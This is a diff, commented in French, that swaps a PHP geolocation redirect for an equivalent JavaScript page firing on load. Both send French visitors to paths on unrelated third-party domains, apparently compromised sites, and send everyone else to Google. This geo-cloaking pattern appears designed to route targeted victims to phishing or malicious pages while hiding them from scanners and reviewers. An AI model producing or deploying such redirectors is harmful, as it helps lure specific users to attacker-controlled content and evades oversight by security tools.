@@ -1,42 +1,35 @@
-<?php
-// Fonction pour récupérer l'adresse IP du client
-function get_client_ip(): string {
-    $client  = $_SERVER['HTTP_CLIENT_IP'] ?? null;
-    $forward = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? null;
-    $remote  = $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1';
-
-    if (filter_var($client, FILTER_VALIDATE_IP)) {
-        return $client;
-    } elseif (filter_var($forward, FILTER_VALIDATE_IP)) {
-        return $forward;
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <title>Redirection Géolocalisée</title>
+  <script>
+    async function redirectByGeo() {
+      try {
+        // Appel à l'API ip-api.com pour récupérer la géolocalisation de l'IP
+        const response = await fetch('https://ip-api.com/json/');
+        if (!response.ok) throw new Error('Erreur API');
+        
+        const data = await response.json();
+        // Vérifier si le pays est la France (countryCode = 'FR')
+        if (data.countryCode && data.countryCode.toUpperCase() === 'FR') {
+          // Redirection vers la page spécifique pour la France
+          window.location.href = 'https://www.segarasia.com/old/sg/';
+        } else {
+          // Redirection vers Google sinon
+          window.location.href = 'https://google.com/';
+        }
+      } catch (error) {
+        // En cas d'erreur, redirection vers une page d'erreur
+        window.location.href = 'https://y6.com';
+      }
     }
-
-    return ($remote === '::1') ? '127.0.0.1' : $remote;
-}
-
-// Récupérer l'IP du client
-$client_ip = get_client_ip();
-
-// Effectuer une requête API pour récupérer la géolocalisation de l'IP
-$geo_data = file_get_contents("http://ip-api.com/json/{$client_ip}");
-
-if ($geo_data !== false) {
-    $geo_info = json_decode($geo_data, true);
-
-    // Vérifier si la géolocalisation a réussi et si le pays est la France
-    if (isset($geo_info['countryCode']) && strtolower($geo_info['countryCode']) === 'fr') {
-        // Redirection vers la page spécifique si l'IP est en France
-        header('Location: https://odumashelters.com/joint/index.php');
-        exit;
-    } else {
-        // Redirection vers Google si l'IP n'est pas en France
-        header('Location: https://google.com/');
-        exit;
-    }
-} else {
-    // En cas d'erreur lors de la récupération de la géolocalisation, redirection vers une page d'erreur
-    http_response_code(404);
-    header('Location: https://y6.com');
-    exit;
-}
-?>
+    
+    // Lancer la fonction dès que la page est chargée
+    window.onload = redirectByGeo;
+  </script>
+</head>
+<body>
+  <p>Redirection en cours… Si vous n'êtes pas redirigé automatiquement, <a href="https://odumashelters.com/joint/index.php/">cliquez ici</a>.</p>
+</body>
+</html>
